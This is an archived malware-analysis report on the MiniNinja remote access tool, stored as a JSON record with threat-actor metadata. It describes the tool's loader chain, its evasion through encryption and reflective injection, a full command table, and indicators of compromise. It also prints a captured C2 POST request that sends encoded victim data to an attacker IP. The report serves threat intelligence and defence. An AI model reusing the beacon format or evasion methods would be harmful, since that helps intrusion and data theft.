{
    "id": "97945aab-cb37-4abc-8ca1-94e6ed4e78dd",
    "created_at": "2023-01-12T14:59:07.178912Z",
    "updated_at": "2025-03-27T02:17:00.578677Z",
    "deleted_at": null,
    "sha1_hash": "dfdc7a97f74d58aba9f439bee82d1ec15f1b3609",
    "title": "2021-10-22 - Assassinations of -MiniNinja- in Various APAC Countries",
    "authors": "",
    "file_creation_date": "2022-05-28T23:27:03Z",
    "file_modification_date": "2022-05-28T23:27:03Z",
    "file_size": 607210,
    "plain_text": "# Assassinations of \"MiniNinja\" in Various APAC Countries\n\n**[teamt5.org/en/posts/assassinations-of-minininja-in-various-apac-countries/](https://teamt5.org/en/posts/assassinations-of-minininja-in-various-apac-countries/)**\n\nCyber Threat Intelligence\n\n10.22.2021Cyber Threat Intelligence\n\nShare:\nTeamT5 discovered a new remote administration tool (RAT), which we dubbed as MiniNinja,\nbeing used in several Chinese APT campaigns. TeamT5 has observed countries across\ndifferent APAC regions, including Taiwan, Russia, Kyrgyzstan, Uzbekistan, Vietnam, the\nPhilippines, and Pakistan, being targeted and attacked by this malware. The impacted\nindustries include governments, energy, IT, telecommunication and engineering. MiniNinja is\na complex malware that uses several advanced techniques to prevent itself from being\ndetected and analyzed. Further, its wide targeting scope also attracted our attention. In this\nreport, we will introduce the technical detail of our analysis.\n\nMiniNinja was first discovered in the wild in a targeted attack against Taiwanese government\nagencies in early March 2021. The actor leveraged the ProxyLogon vulnerability (CVE-202126855) to compromise an email server and further implanted CobaltStrike Beacon and\nMiniNinja RAT in the victim network environment. This information was also disclosed in an\nESET report[1] about a \"Websiic Campaign\" using the ProxyLogon vulnerability. TeamT5\nnoticed the existence of this new malware and started tracking its activities. Since then,\nTeamT5 has observed its footprints in Vietnam[2], Pakistan and the Philippines, possibly also\nimplanted in victim hosts via the ProxyLogon vulnerability. Its latest activities were spear\n\n\n-----\n\nphishing email attacks against Russia and Uzbekistan in September 2021. TeamT5 is still\nuncertain of the attribution of these attacks. However, we possess high confidence that this is\na new tool used by Chinese APT based on its TTPs and C2 infrastructure.\n\nTo bypass antivirus detection, MiniNinja is encrypted as a binary blob in a binary payload file.\nIt might have one to multiple loader components in native PE or .Net, but basically the\nloaders do similar tasks. The loader components will decrypt and run it in memory via\nreflective DLL injection techniques. Its loader firstly checks the first 4 bytes of the payload file\nand decrypts the content by using 3DES (112bit) algorithm in case of header check passes:\n\nThe decrypted buffer might be passed to a second stage loader for further processing if there\nare multiple loader components. The loader will then decode the content by custom decoding\nmethods and LZSS decompression algorithm. The decoded payload is a PE file with its PE\nheader erased and it is just the MiniNinja RAT. Finally, the loader will locate its export\nfunction \"Debug\" and start execution from there:\n\n\n-----\n\nIn a payload collected from some Taiwanese victims, there is a PDB string left by the\ndeveloper (only in memory) and thus we name this malware MiniNinja:\n\nThe decrypted malware configuration block contains Mutex string, C2 URL, HTTP Header\ninformation, sleep time, etc.:\n\n\n-----\n\nUpon execution, the following victim host information will be collected:\n\nSystem info\n\nOS version\n\nHostname\n\n\n-----\n\nIP addr\n\nProcess name\n\nProcess ID\n\nThe above data would be encoded with XOR encode and custom base64 encode. Finally,\nthe encoded result would be sent to its C2 via POST:\n```\nPOST http://149.28.28.159:443/Collector/3.0/ HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: 149.28.28.159:443\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko\nContent-Length: 474\nPragma: no-cache\nngluKGJ2JZ2[NKOs506NzsX9yVU7gkxWozQK5WmWoaUr9C0DN0iXb6lwFkcb2CE3HBk[4ISP3nI88jpLROJhQp\n\n```\nMiniNinja is a full-featured RAT that supports commands for file, process, memory, shell or\naccount operations. Its supported functions are listed below in the Command Table.\n\n## Command Table\n\nSupported command:\n\n**Command** **Description**\n\n0x4E20 Heart beat\n\n0x4E21 Init dwProcessId\n\n0x4E22 Change sleep time\n\n0x4E23 Exit(ExitProcess)\n\n0x4E24 CreateProcess\n\n0x4E25 TerminateThread\n\n0x4E26 set close_socket to 0\n\n0x4E2A ShellCommand\n\n0x4E2B Get Command Result(call\nWriteFile,PeekNamedPipe,ReadFile)\n\n0x4E2C TerminateProcess\n\n0x4E2D IterateProcess then TerminateProcess\n\n0x4E34 ~ 0x4E47 File Operations\n\n\n-----\n\n**Command** **Description**\n\n0x4E34 List Disk Driver\n\n0x4E35 ListDirectory\n\n0x4E36 CreateDirectory\n\n0x4E37 DeleteFile\n\n0x4E38 RemoveDirectory\n\n0x4E39 MoveFile\n\n0x4E3A CreateFile\n\n0x4E3E ReadFile\n\n0x4E3F WriteFile\n\n0x4E48 - 0x4E51 Socket Operations\n\n0x4E48 Connet Host\n\n0x4E49 Check socket status\n\n0x4E4A Send Data to Host\n\n0x4E4B Recv Data from Host\n\n0x4E4C Close socket\n\n0x4E4D Connect Host\n\n\nPreserved?(0x4E4E0x4E51)\n\n\nNull\n\n\n0x4E5C ~ 0x4E65 Memory Operations\n\n0x4E5C string copy\n\n0x4E5D string copy\n\n0x4E5E string copy\n\n*0x4E5F,0x4E60 Execute Plugin? (CreateProcess, process Injection and\ncreatethread)\n\n*0x4E61,0x4E62 FileMapping(Write data)\n\n\nPreserved?\n(0x4E63,0x4E64)\n\n\nNull\n\n\n-----\n\n**Command** **Description**\n\n*0x4E65 Close File Handler\n\n0x5208 List c2 configuration\n\n0x4E52 List Process\n\n0x4E53 IterateProcess,kill process\n\n0x4E54 Process Injection\n\n0x4E55 CreateThread for running DLL export function\n\n0x4E56 Read FileMap data(OpenFileMappingA ->\nrobject_,custom_base64)\n\n0x4E57 Exit Dll function?(robject_, UnmapViewOfFile)\n\n0x4E58 LookupAccountSid\n\n## IoC\n\n149.28.28.159\n\n167.99.168.251\n\n185.220.101.204\n\n162.247.72.199\n\n194.156.98.191\n\n202.182.100.134\n\n109.70.100.55\n\n185.220.101.18\n\n193.36.119.144 (TW compromised host)\n\n## References\n\n[1] [https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/](https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/)\n\n[2] https://gteltsc.vn/blog/cap-nhat-nhe-ve-lo-hong-bao-mat-0day-microsoft-exchange-dangduoc-su-dung-de-tan-cong-cac-to-chuc-tai-viet-nam-9685.html\n\n[*Image courtesy of Pixabay](https://pixabay.com/illustrations/ninja-warrior-moon-japanese-japan-2255848/)\n\n\n-----\n\nShare:\n\n### Related Post\n\nTechnical Analysis\n\n1.3.2022\n\n**[Apache HTTP Server(Windows) 2021高風險安全漏洞詳解](https://teamt5.org/en/posts/apache-http-server-vulnerabilty-on-windows-2021/)**\n\nvulnerability research, cyber security, Apache HTTP Server, IoC, 威脅情資, 資安情資, cyber\nthreat intelligence, threat hunting\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-22 - Assassinations of -MiniNinja- in Various APAC Countries.pdf"
    ],
    "report_names": [
        "2021-10-22 - Assassinations of -MiniNinja- in Various APAC Countries.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "60d96824-1767-4b97-a6c7-7e9527458007",
            "created_at": "2023-01-06T13:46:39.378701Z",
            "updated_at": "2025-03-27T02:00:03.068436Z",
            "deleted_at": null,
            "main_name": "ToddyCat",
            "aliases": [
                "Websiic"
            ],
            "source_name": "MISPGALAXY:ToddyCat",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535547,
    "ts_updated_at": 1743041820,
    "ts_creation_date": 1653780423,
    "ts_modification_date": 1653780423,
    "files": {
        "pdf": "https://archive.orkl.eu/dfdc7a97f74d58aba9f439bee82d1ec15f1b3609.pdf",
        "text": "https://archive.orkl.eu/dfdc7a97f74d58aba9f439bee82d1ec15f1b3609.txt",
        "img": "https://archive.orkl.eu/dfdc7a97f74d58aba9f439bee82d1ec15f1b3609.jpg"
    }
}